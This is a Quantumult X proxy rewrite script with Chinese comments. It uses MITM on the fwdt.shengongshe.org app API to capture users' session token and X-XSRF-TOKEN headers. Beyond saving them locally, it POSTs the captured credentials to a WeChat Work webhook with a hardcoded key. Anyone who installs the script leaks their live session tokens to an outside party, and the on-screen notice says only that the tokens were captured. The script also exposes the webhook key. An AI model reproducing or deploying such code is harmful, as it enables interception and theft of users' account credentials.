/*
===================
[MITM]
hostname = fwdt.shengongshe.org

===================
【 QX  脚本配置 】 :
===================
[rewrite_local]
^https:\/\/fwdt\.shengongshe\.org\/sgsWchartApi\/api\/User\/getUserInfoForApp url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/sss.js
 
*/

if ($request) {
    let xsrfToken = $request.headers['X-XSRF-TOKEN'];   // 提取 X-XSRF-TOKEN
    let token = $request.headers['token'];              // 提取 token
    let url = $request.url;
    
    if (url.indexOf("https://fwdt.shengongshe.org/sgsWchartApi/api/User/getUserInfoForApp") !== -1) {
        if (xsrfToken && token) {
            $prefs.setValueForKey(xsrfToken, "xsrfTokenKey");  // 保存 xsrfToken 到本地存储
            $prefs.setValueForKey(token, "tokenKey");          // 保存 token 到本地存储
            let message = `${token}&${xsrfToken}`;
            $notify("shengongshe 成功获取Token和X-XSRF-TOKEN", "", message);
            console.log(`Token值 & X-XSRF-TOKEN值\n${message}`);

            // 发送到企业微信消息
            let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; 
            let wechatMessage1 = {
                "msgtype": "text",
                "text": {
                    "content": `shengongshe 成功获取Token值&X-XSRF-TOKEN值`
                }
            };
            
            let wechatMessage2 = {
                "msgtype": "text",
                "text": {
                    "content": `${message}`
                }
            };
            
            // 使用 $task.fetch 发送第一条消息
            let options1 = {
                url: wechatWebhookUrl,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(wechatMessage1)
            };
            
            $task.fetch(options1).then(response => {
                console.log(`第一条消息发送成功: ${response.body}`);
            
                // 使用 $task.fetch 发送第二条消息
                let options2 = {
                    url: wechatWebhookUrl,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(wechatMessage2)
                };
            
                return $task.fetch(options2).then(response => {
                    console.log(`第二条消息发送成功: ${response.body}`);
                    $done(); // 在第二条消息发送成功后调用 $done()
                });
            
            }, reason => {
                console.log(`第一条消息发送失败: ${reason.error}`);
                $done(); // 在第一条消息发送失败后调用 $done()
            });

        } else {
            $notify(`失败`, `未找到 X-XSRF-TOKEN 和 Token`, `请检查请求头`);  // 未找到 X-XSRF-TOKEN 和 Token 时通知
            $done(); // 未找到 token 时调用 $done()
        }
    } else {
        $done(); // URL 不匹配时调用 $done()
    }
}



